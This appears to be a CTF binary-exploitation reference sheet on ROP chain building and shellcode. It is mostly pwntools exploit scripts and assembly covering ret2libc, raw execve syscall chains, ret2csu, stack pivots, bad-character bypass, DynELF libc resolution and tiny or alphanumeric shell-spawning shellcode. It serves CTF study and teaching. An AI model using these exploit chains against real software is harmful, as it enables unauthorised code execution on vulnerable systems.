# CTF Pwn - ROP Chains and Shellcode

## Table of Contents
- [ROP Chain Building](#rop-chain-building)
  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak--shell)
  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
  - [Shell Interaction After execve](#shell-interaction-after-execve)
- [ret2csu — __libc_csu_init Gadgets (Crypto-Cat)](#ret2csu--__libc_csu_init-gadgets-crypto-cat)
- [Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
- [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)](#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat)
  - [64-bit: BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
  - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
- [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
- [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
- [DynELF Automated Libc Discovery (RC3 CTF 2016)](#dynelf-automated-libc-discovery-rc3-ctf-2016)
- [Constrained Shellcode in Small Buffers (TUM CTF 2016)](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
- [Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
- [Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
- [Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)
- [stub_execveat Syscall as execve Alternative (ASIS CTF 2018)](#stub_execveat-syscall-as-execve-alternative-asis-ctf-2018)
- [Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)](#alphanumeric-shellcode-bootstrap-via-pushpop-when-rax0-nullcon-hackim-2019)

For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).

---

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### Two-Stage ret2libc (Leak + Shell)

When exploiting in two stages, choose the return target for stage 2 carefully:

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**Leak parsing with no-newline printf:**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**When to use raw syscall vs libc functions:**
- `system()` through libc: simplest, but may crash due to stack alignment or CET
- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead

### rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

### Shell Interaction After execve

After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

## ret2csu — __libc_csu_init Gadgets (Crypto-Cat)

**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.

**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
```asm
pop rbx        ; 0
pop rbp        ; 1
pop r12        ; function pointer (address of GOT entry)
pop r13        ; edi value
pop r14        ; rsi value
pop r15        ; rdx value
ret
```

**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
```asm
mov rdx, r15   ; rdx = r15
mov rsi, r14   ; rsi = r14
mov edi, r13d  ; edi = r13 (32-bit!)
call [r12 + rbx*8]  ; call function pointer
add rbx, 1
cmp rbp, rbx
jne .loop      ; loop if rbx != rbp
; falls through to gadget 1 pop chain
```

**Exploit pattern:**
```python
csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL

payload = flat(
    b'A' * offset,
    csu_pop,
    0,            # rbx = 0 (index)
    1,            # rbp = 1 (loop count, must equal rbx+1)
    elf.got['puts'],  # r12 = function to call (GOT entry)
    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
    0xcafebabe,   # r14 → rsi (second arg)
    0x12345678,   # r15 → rdx (third arg)
    csu_call,     # trigger mov + call
    b'\x00' * 56, # padding for the 7 pops after call returns
    next_gadget,  # return address after csu completes
)
```

**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.

**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.

---

## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)

**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).

**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.

**Required gadgets:**
```asm
pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
xor [r15], r14; ret            ; XOR memory at r15 with r14
mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
```

**Exploit pattern:**
```python
data_section = elf.symbols['__data_start']  # or .data address
xor_key = 2  # simple key that removes bad chars

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# Write XOR'd data in 8-byte chunks
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR'd data
        data_section + i,         # destination address
        mov_r15_r14,              # write to memory
    )

# XOR each chunk back to recover original
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR key
        data_section + i,         # target address
        xor_r15_r14,              # decode in place
    )

# Now data_section contains "flag.txt" — use it as argument
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.

---

## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)

**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.

### 64-bit: BEXTR + XLAT + STOSB

**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.

```python
# Gadgets from questionableGadgets section of binary
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# Write "flag.txt" byte by byte
for i, char in enumerate(b"flag.txt"):
    # Find address of char in binary's read-only data
    char_addr = next(elf.search(bytes([char])))

    # BEXTR extracts rbx from rcx using rdx as control
    # rcx = char_addr - 0x3ef2 (compensate for add)
    # rdx = 0x4000 (extract 64 bits starting at bit 0)
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx (BEXTR control: start=0, len=64)
        char_addr - 0x3ef2,        # rcx (offset compensated)
        xlat_ret,                  # al = byte at [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```

### 32-bit: PEXT (Parallel Bits Extract)

**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax; ...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """Find 32-bit mask that extracts target_byte from source via PEXT."""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # Select 8 bits from source that match target bits
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.

---

## Stack Pivot via xchg rax,esp (Crypto-Cat)

**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.

**Two-stage pattern:**
```python
# Stage 1: Program provides a heap address where it wrote user data
pivot_addr = int(io.recvline(), 16)

# Prepare ROP chain at the pivot address (via earlier input)
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # leak libc
    elf.symbols['main'],         # return to main for stage 3
)
io.send(stage2_rop)             # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # load pivot address into rax
    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
)
```

**Why xchg vs. leave;ret:**
- `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
- `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)

**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.

---

## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)

**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.

```python
from pwn import *

# Step 1: Scan executable for addresses containing each needed byte
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # Maps byte value -> address in executable
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # Clean 3 args
    rop += p32(bss_addr + i)     # Destination
    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
    rop += p32(0)                # Unused arg

# Step 3: Jump to assembled shellcode on BSS
rop += p32(bss_addr)
```

**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.

---

## DynELF Automated Libc Discovery (RC3 CTF 2016)

When the remote libc version is unknown, use pwntools' `DynELF` to resolve function addresses at runtime by leaking memory through a format string or read primitive.

```python
from pwn import *

elf = ELF('./target')
io = remote('target.ctf', 1337)

# Define a leak function that reads memory at a given address
def leak(addr):
    payload = b'A' * offset
    payload += p64(elf.plt['printf'])  # call printf to leak
    payload += p64(main_addr)          # return to main for next leak
    payload += p64(addr)               # argument: address to read
    io.sendline(payload)
    data = io.recvuntil(b'prompt', drop=True)
    return data

# DynELF resolves symbols by parsing ELF structures in memory
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string

log.success(f"system @ {hex(system_addr)}")

# Build final ROP chain with resolved addresses
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
io.interactive()
```

**Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.

---

## Constrained Shellcode in Small Buffers (TUM CTF 2016)

When shellcode space is severely limited (e.g., 15-16 bytes due to AES block size), use minimal register setup and avoid unnecessary instructions.

```asm
; 15-byte execve("/bin/sh") shellcode for x86-64
; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack
; Written in fasm syntax:

lea rdi, [rsp + 0x19]    ; 4 bytes - pointer to "/bin/sh" on stack
cdq                       ; 1 byte  - rdx = 0 (envp = NULL)
push rdx                  ; 1 byte  - NULL terminator for argv
push rdi                  ; 1 byte  - argv[0] = "/bin/sh"
push rsp                  ; 1 byte
pop rsi                   ; 1 byte  - rsi = argv = {"/bin/sh", NULL}
push 0x3b                 ; 2 bytes - syscall number for execve
pop rax                   ; 1 byte  - rax = 59
syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
; Total: 15 bytes

; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
```

**Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.

---

## Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)

**When to use:** Need `rdx = 0` for `execve(path, argv, NULL)` but no `pop rdx; ret` gadget exists in the binary. The canary verification epilogue `xor rdx, fs:28h` zeros RDX when the canary is intact.

```python
from pwn import *

# Canary check epilogue (found in most binaries):
# mov rdx, [rsp+8]    ; load canary from stack
# xor rdx, fs:28h     ; XOR with stored canary → 0 if intact
# Jump into this code as a "gadget" to zero RDX

# Find the canary check sequence in the binary
canary_xor_gadget = next(binary.search(asm(
    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
)))
# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)

# Use in ROP chain:
rop = flat(
    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
    pop_rsi, 0,                   # rsi = NULL (argv)
    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
    execve_addr,                  # execve("/bin/sh", NULL, NULL)
)
```

**Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable -- it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.

**When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly -- it appears in every function with a stack canary.

**References:** VolgaCTF 2017

---

## Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)

**Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.

**Example (x86-32 write syscall, entry: eax=4, ebx=1):**
```asm
; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
; Goal: write flag buffer to stdout — only need ecx and edx

; 3-byte: point ecx at the flag buffer
lea ecx, [edi + flag_offset]   ; 3 bytes (if offset fits in 1 byte)

; 2-byte: set edx (byte count)
mov dl, 64                      ; 2 bytes

; 2-byte: trigger syscall
int 0x80                        ; 2 bytes

; Total: 7 bytes — or as few as 5 if edx is already set
```

**Workflow:**
```python
# 1. Run the binary in gdb, break right before shellcode is executed
# 2. Inspect all registers: info registers
# 3. Identify which syscall arguments are already set
# 4. Write only the instructions needed to fill missing arguments

# Useful pre-initialized patterns:
# - eax = syscall number already set by caller
# - ebx = fd (stdin=0, stdout=1) from prior open/setup
# - rdi, rsi from calling convention leakage
# - rsp pointing into a writable region (for push-based addressing)
```

**Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.

**References:** Square CTF 2017

---

## Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)

**Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).

**8-byte stager construction:**
```asm
; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
; Side effect of syscall: rcx = RIP (address of next instruction after syscall)

syscall          ; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8)
                 ;           and sets rcx = &next_instr (= shellcode_buf + 2)
push rcx         ; 1 byte:  51 — stack = [shellcode_buf + 2]
pop rsi          ; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
; ... or arrange entry so the next syscall reads 100 bytes to rsi
```

**Uniqueness constraint:**
```python
# All 8 bytes must be distinct (challenge-specific filter)
# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
# Verify: len(set(bytes)) == len(bytes)
stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
assert len(set(stager)) == len(stager)  # passes

# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
from pwn import *
p.send(stager)
p.send(asm(shellcraft.sh()))
```

**Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.

**References:** HITCON CTF 2017

---

## stub_execveat Syscall as execve Alternative (ASIS CTF 2018)

**Pattern:** In a tiny binary with only `read` syscall and no `pop rax` gadget, use `stub_execveat` (syscall 0x142/322) instead of `execve` (0x3b). Since `read()` returns bytes-read in `rax`, make total input length exactly 0x142 bytes so `rax=0x142` when the syscall gadget fires.

**Why this works:**
1. The binary is tiny -- only `read` and basic gadgets, no `pop rax; ret`
2. `execve` requires `rax=0x3b` (59), but without `pop rax` there's no way to set it
3. `read()` returns the number of bytes read in `rax` -- this is the only rax control
4. `stub_execveat` (syscall 322 = 0x142) accepts the same arguments as `execve` when `AT_FDCWD` is used for the directory fd
5. Send exactly 0x142 bytes so `read()` returns 0x142, then hit `syscall`

```python
from pwn import *

# Binary gadgets (tiny static binary)
xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
syscall_gadget  = 0x400101   # syscall

# Build payload: /bin/sh string + padding + ROP chain
# Total length must be exactly 0x142 bytes
payload  = b"/bin/sh\x00"                          # rdi points here
payload += b"B" * (0x148 - (8*4) - 8)              # padding to ROP area
payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
payload += p64(syscall_gadget)                      # syscall (rax=0x142 from read)
payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
# rax = 0x142 from read() return value = stub_execveat syscall number

io = remote('target', 1337)
io.send(payload)
io.interactive()
```

**Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.

**References:** ASIS CTF 2018

---

## Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)

**Pattern (easy-shell):** RWX page receives attacker shellcode but every byte must be alphanumeric (`[0-9A-Za-z]`). Tools like [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) emit self-decoding stubs but require `rax + padding_len == shellcode_address` at entry. When the harness enters with `rax = 0` (not anywhere near the shellcode) the encoder has nothing to land on. Prepend a tiny 3-byte non-alnum-but-accepted seed — `push r12; pop rax` — so `rax` becomes a live stack/code pointer, then call the encoder with `padding_len=3`.

```python
from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')
sc = '''
    mov rax, %s
    push rax
    mov rdi, rsp
    mov rax, 2          /* open(rsp, 0) */
    mov rsi, 0
    syscall
    mov rdi, rax
    sub rsp, 0x20
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0          /* read(fd, rsp, 0x20) */
    syscall
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 1          /* write(1, rsp, 0x20) */
    syscall
''' % hex(u64(file_name))
sc = asm(sc)

# push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
bootstrap = asm("push r12; pop rax;")
payload = bootstrap + alphanum_encoder(sc, 3)
```

**Key insight:** Alphanumeric-only decoders typically need `rax` to point at (or a fixed offset before) the payload. If the harness zeroes `rax`, seed it from *any* volatile register that already holds a valid address — `r12` is routinely `_start` on Linux, and `push r12; pop rax` happens to be `AT X` (0x41 0x54 0x58), which the encoder's input filter treats as benign. Adjust the encoder's `padding_len` argument to exactly match the prepended byte count so the decode math still lines up.

**References:** nullcon HackIM 2019 — easy-shell, writeups 13048, 13203
